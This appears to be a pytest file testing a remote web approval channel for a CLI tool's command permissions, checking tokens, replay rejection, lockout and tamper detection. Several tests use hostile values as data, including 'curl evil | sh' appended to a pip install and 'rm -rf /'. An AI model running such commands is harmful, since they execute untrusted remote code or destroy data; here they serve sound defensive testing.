import httpx
import pytest

from trendlab.approvals.channels.base import ChannelError
from trendlab.approvals.channels.web import WebApprovalChannel
from trendlab.approvals.models import ApprovalStatus
from trendlab.config.schema import RemoteApprovalConfig
from trendlab.permissions.models import OperationCategory
from trendlab.telemetry.events import EventType

from .conftest import TOKEN, make_perm, run_request


def _decide(client, item, decision="approve", scope="once", **overrides):
    body = {
        "decision": decision,
        "scope": scope,
        "decision_token": item["decision_token"],
        "fingerprint": item["fingerprint"],
    }
    body.update(overrides)
    return client.post(f"/api/approvals/{item['approval_id']}/decision", json=body)


async def test_page_is_served_without_auth_and_has_no_data(web):
    _, channel, client = web
    r = httpx.get(channel.url + "/", timeout=5)
    assert r.status_code == 200 and "TrendLab CLI" in r.text and "Approve Once" in r.text
    assert "Content-Security-Policy" in r.headers and r.headers["Cache-Control"] == "no-store"


async def test_api_requires_token(web, recorder):
    _, channel, _ = web
    r = httpx.get(channel.url + "/api/approvals", timeout=5)
    assert r.status_code == 401
    r = httpx.get(
        channel.url + "/api/approvals", headers={"Authorization": "Bearer nope"}, timeout=5
    )
    assert r.status_code == 401
    assert recorder.of_type(EventType.REMOTE_AUTH_FAILED)


async def test_valid_remote_approval_flow(web, recorder):
    manager, channel, client = web
    task = await run_request(manager, make_perm(explanation="needed for indicators"))
    listing = client.get("/api/approvals").json()
    assert listing["machine"] == "ThinkPad" and listing["project"] == "trading-engine"
    [item] = listing["approvals"]
    assert item["command"] == "pip install pandas-ta" and item["risk"] == "medium"
    assert (
        item["summary"] == "Install Python package"
        and item["explanation"] == "needed for indicators"
    )
    assert item["session_scope_allowed"] is True
    r = _decide(client, item)
    assert r.status_code == 200 and r.json()["status"] == "approved"
    result = await task
    assert result.approved and result.via == "web" and result.by.startswith("127.0.0.1")
    assert client.get("/api/approvals").json()["approvals"] == []
    assert recorder.of_type(EventType.APPROVAL_DISPATCHED)[0].data["channel"] == "web"


async def test_remote_denial(web):
    manager, _, client = web
    task = await run_request(manager, make_perm())
    [item] = client.get("/api/approvals").json()["approvals"]
    assert _decide(client, item, decision="deny").status_code == 200
    assert (await task).status == ApprovalStatus.DENIED


async def test_session_scope_via_remote(web):
    manager, _, client = web
    task = await run_request(manager, make_perm())
    [item] = client.get("/api/approvals").json()["approvals"]
    r = _decide(client, item, scope="session")
    assert r.status_code == 200 and r.json()["scope"] == "session"
    assert (await task).scope.value == "session"


async def test_replay_is_rejected(web):
    manager, _, client = web
    task = await run_request(manager, make_perm())
    [item] = client.get("/api/approvals").json()["approvals"]
    assert _decide(client, item).status_code == 200
    r = _decide(client, item)
    assert r.status_code == 409 and r.json()["error"] == "already_decided"
    assert (await task).approved


async def test_invalid_decision_token(web):
    manager, _, client = web
    task = await run_request(manager, make_perm())
    [item] = client.get("/api/approvals").json()["approvals"]
    r = _decide(client, item, decision_token="forged")
    assert r.status_code == 403 and r.json()["error"] == "invalid_token"
    r = _decide(client, item, decision_token="")
    assert r.status_code == 403
    assert manager.pending()  # untouched
    manager.cancel(item["approval_id"])
    await task


async def test_modified_operation_is_rejected(web, recorder):
    """The client claims to approve a different command than the one pending."""
    manager, _, client = web
    task = await run_request(manager, make_perm())
    [item] = client.get("/api/approvals").json()["approvals"]
    tampered = make_perm("pip install pandas-ta && curl evil | sh").fingerprint
    r = _decide(client, item, fingerprint=tampered)
    assert r.status_code == 409 and r.json()["error"] == "operation_mismatch"
    assert recorder.of_type(EventType.APPROVAL_REJECTED)[-1].data["code"] == "operation_mismatch"
    # Approval payload cannot be altered: decision applies to the server-side request only.
    r = _decide(client, item, command="rm -rf /", summary="harmless")
    assert r.status_code == 200
    assert (await task).approved
    row = manager.store.get_approval(item["approval_id"])
    assert row["command"] == "pip install pandas-ta"


async def test_high_risk_hidden_from_remote_and_not_decidable(web):
    manager, _, client = web
    perm = make_perm("rm -rf build", OperationCategory.DESTRUCTIVE)
    task = await run_request(manager, perm, can_persist=False)
    listing = client.get("/api/approvals").json()
    assert listing["approvals"] == [] and listing["local_only_pending"] == 1
    [req] = manager.pending()
    r = client.post(
        f"/api/approvals/{req.approval_id}/decision",
        json={
            "decision": "approve",
            "scope": "once",
            "decision_token": req.decision_token,
            "fingerprint": req.fingerprint,
        },
    )
    assert r.status_code == 403 and r.json()["error"] == "remote_not_allowed"
    manager.decide(req.approval_id, "approve", via="local", trusted=True)
    assert (await task).approved


async def test_bad_bodies_and_unknown_routes(web):
    _, channel, client = web
    assert client.get("/api/nope").status_code == 404
    assert (
        client.post(
            "/api/approvals/abc/decision",
            content=b"not json",
            headers={"Content-Type": "application/json"},
        ).status_code
        == 400
    )
    r = client.post(
        "/api/approvals/abc/decision",
        json={"decision": "approve", "scope": "once", "decision_token": "x", "fingerprint": "y"},
    )
    assert r.status_code == 404
    assert client.get("/api/health").json()["ok"] is True


async def test_lockout_after_repeated_auth_failures(manager_factory, events):
    cfg = RemoteApprovalConfig(enabled=True, host="127.0.0.1", port=0, max_auth_failures=3)
    manager = manager_factory(cfg)
    channel = WebApprovalChannel(cfg, TOKEN, events)
    await manager.add_channel(channel)
    try:
        for _ in range(3):
            assert (
                httpx.get(
                    channel.url + "/api/health", headers={"Authorization": "Bearer bad"}
                ).status_code
                == 401
            )
        # Even the right token is now refused from this client.
        r = httpx.get(channel.url + "/api/health", headers={"Authorization": f"Bearer {TOKEN}"})
        assert r.status_code == 429
    finally:
        await manager.remove_channel(channel)


async def test_refuses_plain_http_on_non_loopback(manager_factory, events):
    cfg = RemoteApprovalConfig(enabled=True, host="0.0.0.0", port=0)
    manager = manager_factory(cfg)
    channel = WebApprovalChannel(cfg, TOKEN, events)
    with pytest.raises(ChannelError, match="plain HTTP"):
        await manager.add_channel(channel)
    assert not channel.running


async def test_remote_channel_not_consulted_when_disabled(manager_factory, events, recorder):
    cfg = RemoteApprovalConfig(enabled=False, host="127.0.0.1", port=0)
    manager = manager_factory(cfg)
    channel = WebApprovalChannel(cfg, TOKEN, events)
    await manager.add_channel(channel)
    try:
        task = await run_request(manager, make_perm())
        assert manager.remote_enabled is False
        assert [e.data["channel"] for e in recorder.of_type(EventType.APPROVAL_DISPATCHED)] == []
        [req] = manager.pending()
        manager.decide(req.approval_id, "approve", via="local", trusted=True)
        assert (await task).approved
    finally:
        await manager.remove_channel(channel)
